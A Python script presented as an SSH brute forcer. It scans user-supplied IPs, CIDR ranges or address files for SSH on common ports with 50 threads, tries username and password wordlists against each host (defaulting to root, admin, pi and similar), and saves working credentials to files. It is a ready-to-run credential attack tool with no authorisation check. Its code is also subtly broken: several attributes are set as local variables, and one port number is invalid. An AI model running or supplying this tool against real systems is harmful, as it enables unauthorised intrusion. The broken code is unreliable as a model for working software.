#!/usr/bin/env python3
"""
SSH Brute Forcer - Port Scanner + Multi-SSH Attack
Scans for open SSH ports (22, 2222, 22222, etc.) then brute forces with wordlist
Author: Security Research
"""

import socket
import threading
import paramiko
import sys
import time
import queue
from datetime import datetime
import ipaddress
import random

class SSHBruteforcer:
    def __init__(self, threads=50, timeout=5):
        self.threads = threads
        self.timeout = timeout
        self.scan_queue = queue.Queue()
        brute_queue = queue.Queue()
        self.open_ssh = []
        self.found_creds = []
        lock = threading.Lock()
        self.scanning = True
        brute_running = True
        
        # Common SSH ports
        self.ssh_ports = [22, 2222, 22222, 222222, 2200, 2022, 222, 22222, 2222, 22]
        
        # Banner
        self.print_banner()
    
    def print_banner(self):
        print("""\033[91m
╔═══════════════════════════════════════════════════════════════╗
║                    SSH BRUTE FORCER v2.0                      ║
║            Scanner + Multi-SSH Attack - 50 Threads            ║
╚═══════════════════════════════════════════════════════════════╝\033[0m""")
    
    def get_local_ip(self):
        """Get local IP for network scanning"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.1.1"
    
    def generate_targets(self, target):
        """Generate target IPs from various input formats"""
        targets = []
        
        try:
            # Single IP
            ipaddress.ip_address(target)
            targets.append(target)
            return targets
        except:
            pass
        
        try:
            # CIDR notation (192.168.1.0/24)
            network = ipaddress.ip_network(target, strict=False)
            for ip in network.hosts():
                targets.append(str(ip))
            return targets
        except:
            pass
        
        try:
            # Range (192.168.1.1-254)
            if '-' in target:
                parts = target.split('-')
                base = parts[0].rsplit('.', 1)[0]
                start = int(parts[0].split('.')[-1])
                end = int(parts[1])
                
                for i in range(start, end + 1):
                    targets.append(f"{base}.{i}")
                return targets
        except:
            pass
        
        # File with IPs
        try:
            with open(target, 'r') as f:
                for line in f:
                    ip = line.strip()
                    if ip:
                        targets.append(ip)
            return targets
        except:
            pass
        
        return targets
    
    def scan_port(self, ip, port):
        """Scan single port on IP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                # Check if it's actually SSH
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((ip, port))
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    sock.close()
                    
                    if 'SSH' in banner or 'ssh' in banner.lower():
                        with self.lock:
                            self.open_ssh.append({'ip': ip, 'port': port, 'banner': banner[:50]})
                        print(f"\033[92m[+] OPEN SSH: {ip}:{port} - {banner[:50]}\033[0m")
                        return True
                except:
                    # Still consider it as potential SSH
                    with self.lock:
                        self.open_ssh.append({'ip': ip, 'port': port, 'banner': 'Unknown'})
                    print(f"\033[93m[?] POSSIBLE SSH: {ip}:{port}\033[0m")
                    return True
        except:
            pass
        return False
    
    def scanner_worker(self):
        """Worker thread for scanning"""
        while self.scanning:
            try:
                ip = self.scan_queue.get(timeout=1)
                for port in self.ssh_ports:
                    if not self.scanning:
                        break
                    self.scan_port(ip, port)
                self.scan_queue.task_done()
            except queue.Empty:
                break
            except Exception as e:
                continue
    
    def load_wordlist(self, wordlist_file):
        """Load username:password combinations or separate lists"""
        credentials = []
        
        try:
            # Check if file contains user:pass format
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                first_line = f.readline().strip()
                if ':' in first_line:
                    # user:pass format
                    f.seek(0)
                    for line in f:
                        line = line.strip()
                        if ':' in line:
                            username, password = line.split(':', 1)
                            credentials.append((username.strip(), password.strip()))
                else:
                    # Separate username and password lists?
                    print("\033[93m[?] Wordlist format unknown. Using as password list.\033[0m")
                    # Assume it's password list, we'll need usernames separately
                    pass
        except Exception as e:
            print(f"\033[91m[-] Error loading wordlist: {e}\033[0m")
        
        return credentials
    
    def load_usernames(self, username_file):
        """Load usernames from file"""
        usernames = []
        try:
            with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    user = line.strip()
                    if user:
                        usernames.append(user)
            return usernames
        except:
            return []
    
    def load_passwords(self, password_file):
        """Load passwords from file"""
        passwords = []
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    pwd = line.strip()
                    if pwd:
                        passwords.append(pwd)
            return passwords
        except:
            return []
    
    def ssh_connect(self, ip, port, username, password):
        """Attempt SSH connection"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Set timeout
            client.connect(
                ip,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=self.timeout
            )
            
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            # Server might be rate limiting
            time.sleep(1)
            return False
        except socket.error as e:
            return False
        except Exception as e:
            return False
    
    def brute_worker(self, usernames, passwords):
        """Worker thread for brute forcing"""
        while self.brute_running and not self.brute_queue.empty():
            try:
                target = self.brute_queue.get(timeout=1)
                ip = target['ip']
                port = target['port']
                
                print(f"\033[94m[*] Attacking: {ip}:{port}\033[0m")
                
                for username in usernames:
                    if not self.brute_running:
                        break
                    
                    for password in passwords:
                        if not self.brute_running:
                            break
                        
                        print(f"\033[90m    Trying: {username}:{password}\033[0m", end='\r')
                        
                        if self.ssh_connect(ip, port, username, password):
                            result = f"\033[92m\n[🔥] SUCCESS! {ip}:{port} - {username}:{password}\033[0m"
                            print(result)
                            
                            with self.lock:
                                self.found_creds.append({
                                    'ip': ip,
                                    'port': port,
                                    'username': username,
                                    'password': password
                                })
                            
                            # Save immediately
                            self.save_result(ip, port, username, password)
                            
                            # If found, move to next target
                            break
                    
                    # Small delay to avoid overwhelming
                    time.sleep(0.1)
                
                self.brute_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                continue
    
    def save_result(self, ip, port, username, password):
        """Save found credentials"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('ssh_results.txt', 'a') as f:
            f.write(f"[{timestamp}] {ip}:{port} - {username}:{password}\n")
    
    def save_open_ssh(self):
        """Save open SSH hosts"""
        with open('open_ssh.txt', 'w') as f:
            for ssh in self.open_ssh:
                f.write(f"{ssh['ip']}:{ssh['port']} - {ssh['banner']}\n")
    
    def run(self):
        """Main execution"""
        
        # Get target input
        print("\n\033[93m[?] Enter target (IP, CIDR, range, or file):\033[0m")
        target_input = input("> ").strip()
        
        if not target_input:
            print("\033[91m[-] No target specified\033[0m")
            return
        
        # Generate targets
        print(f"\033[94m[*] Generating targets...\033[0m")
        targets = self.generate_targets(target_input)
        
        if not targets:
            print(f"\033[91m[-] No valid targets generated\033[0m")
            return
        
        print(f"\033[92m[+] Generated {len(targets)} targets\033[0m")
        
        # Load wordlists
        print("\n\033[93m[?] Enter username list file (or press Enter for defaults):\033[0m")
        username_file = input("> ").strip()
        
        print("\033[93m[?] Enter password list file:\033[0m")
        password_file = input("> ").strip()
        
        if not password_file:
            print("\033[91m[-] Password list required\033[0m")
            return
        
        usernames = []
        passwords = []
        
        if username_file:
            usernames = self.load_usernames(username_file)
            passwords = self.load_passwords(password_file)
        else:
            # Default common usernames
            usernames = ['root', 'admin', 'user', 'ubuntu', 'centos', 'pi', 'oracle', 'postgres']
            passwords = self.load_passwords(password_file)
        
        if not usernames:
            print("\033[91m[-] No usernames loaded\033[0m")
            return
        
        if not passwords:
            print("\033[91m[-] No passwords loaded\033[0m")
            return
        
        print(f"\033[92m[+] Loaded {len(usernames)} usernames\033[0m")
        print(f"\033[92m[+] Loaded {len(passwords)} passwords\033[0m")
        
        # Start scanning
        print(f"\n\033[94m[*] Starting SSH scan on {len(targets)} targets with {self.threads} threads...\033[0m")
        
        # Fill scan queue
        for ip in targets:
            self.scan_queue.put(ip)
        
        # Start scanner threads
        scanner_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.scanner_worker)
            t.daemon = True
            t.start()
            scanner_threads.append(t)
        
        # Monitor scan progress
        try:
            while not self.scan_queue.empty():
                time.sleep(2)
                remaining = self.scan_queue.qsize()
                found = len(self.open_ssh)
                print(f"\r\033[94m[*] Scanning... Remaining: {remaining} | Found SSH: {found}\033[0m", end='')
        except KeyboardInterrupt:
            print("\n\033[93m[!] Scan interrupted\033[0m")
            self.scanning = False
        
        # Wait for scanner to finish
        self.scanning = False
        for t in scanner_threads:
            t.join(timeout=1)
        
        # Save open SSH hosts
        self.save_open_ssh()
        
        print(f"\n\033[92m[+] Scan complete! Found {len(self.open_ssh)} open SSH hosts\033[0m")
        
        if not self.open_ssh:
            print("\033[91m[-] No open SSH hosts found. Exiting.\033[0m")
            return
        
        # Show found hosts
        print("\n\033[93m[!] Open SSH hosts:\033[0m")
        for i, ssh in enumerate(self.open_ssh, 1):
            print(f"    {i}. {ssh['ip']}:{ssh['port']} - {ssh['banner']}")
        
        # Ask to proceed with brute force
        print(f"\n\033[93m[?] Proceed with brute force on {len(self.open_ssh)} hosts? (y/n):\033[0m")
        choice = input("> ").lower()
        
        if choice != 'y':
            print("\033[91m[-] Exiting\033[0m")
            return
        
        # Fill brute queue
        for ssh in self.open_ssh:
            self.brute_queue.put(ssh)
        
        total_attempts = len(self.open_ssh) * len(usernames) * len(passwords)
        print(f"\n\033[94m[*] Starting brute force with {self.threads} threads...\033[0m")
        print(f"\033[94m[*] Total combinations: {total_attempts}\033[0m")
        
        # Start brute threads
        brute_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.brute_worker, args=(usernames, passwords))
            t.daemon = True
            t.start()
            brute_threads.append(t)
        
        # Monitor brute progress
        try:
            while not self.brute_queue.empty():
                time.sleep(5)
                remaining = self.brute_queue.qsize()
                found = len(self.found_creds)
                completed = len(self.open_ssh) - remaining
                percent = (completed / len(self.open_ssh)) * 100 if len(self.open_ssh) > 0 else 0
                
                print(f"\r\033[94m[*] Progress: {completed}/{len(self.open_ssh)} hosts ({percent:.1f}%) | Found: {found}\033[0m", end='')
        except KeyboardInterrupt:
            print("\n\033[93m[!] Brute force interrupted\033[0m")
            self.brute_running = False
        
        self.brute_running = False
        
        # Final results
        print(f"\n\n\033[92m[+] Brute force complete!\033[0m")
        
        if self.found_creds:
            print("\n\033[92m[🔥] CREDENTIALS FOUND:\033[0m")
            for cred in self.found_creds:
                print(f"    {cred['ip']}:{cred['port']} - {cred['username']}:{cred['password']}")
            
            # Save final results
            with open('ssh_found.txt', 'w') as f:
                for cred in self.found_creds:
                    f.write(f"{cred['ip']}:{cred['port']} - {cred['username']}:{cred['password']}\n")
        else:
            print("\n\033[91m[-] No credentials found\033[0m")

def main():
    """Main function"""
    
    # Check for paramiko
    try:
        import paramiko
    except ImportError:
        print("\033[91m[-] Paramiko not installed. Install with: pip install paramiko\033[0m")
        sys.exit(1)
    
    # Parse arguments
    import argparse
    parser = argparse.ArgumentParser(description='SSH Brute Forcer - Scanner + Multi-Attack')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    
    args = parser.parse_args()
    
    # Create and run brute forcer
    brute = SSHBruteforcer(threads=args.threads, timeout=args.timeout)
    brute.run()

if __name__ == "__main__":
    main()